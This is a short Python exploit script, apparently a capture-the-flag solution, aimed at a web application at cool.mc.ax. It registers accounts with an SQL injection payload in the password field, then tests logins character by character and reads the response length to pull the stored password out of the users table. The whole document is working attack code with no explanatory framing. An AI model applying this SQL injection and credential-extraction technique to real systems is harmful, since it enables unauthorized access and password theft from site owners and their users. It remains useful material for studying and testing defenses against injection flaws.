import requests

url = "https://cool.mc.ax"
allowed_characters = set(
    'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789'
)
name = "loo"


def exploit():
    password = ""
    for i in range( 1,33 ):

        payload = {
            "username": "{}{}".format( name,i ),
            "password": "'||(substr((select password from users),{},1)))--".format( i )
        }

        if i in [10,20,30]:
            pos = int( str( i )[0] )
            payload = {
                "username": "{}{}".format( "foomids",pos ),
                "password": "'||(substr((select password from users),{},1)))--".format( i )
            }

        res = requests.post( url + '/register',data=payload )
        # print("[+] Registered a user. Payload: ", payload)

        for c in allowed_characters:
            payload = {
                "username": "{}{}".format( name,i ),
                "password": "{}".format( c )
            }

            if i in [10,20,30]:
                pos = int( str( i )[0] )
                payload = {
                    "username": "{}{}".format( "foomids",pos ),
                    "password": "{}".format( c )
                }

            # print(payload)
            res = requests.post( url,data=payload )

            if len( res.text ) < 600:
                password += c
                print( password )
                break

        else:
            print( "Not found at position: {}".format( i ) )
            password += '_'
            print( password )


exploit()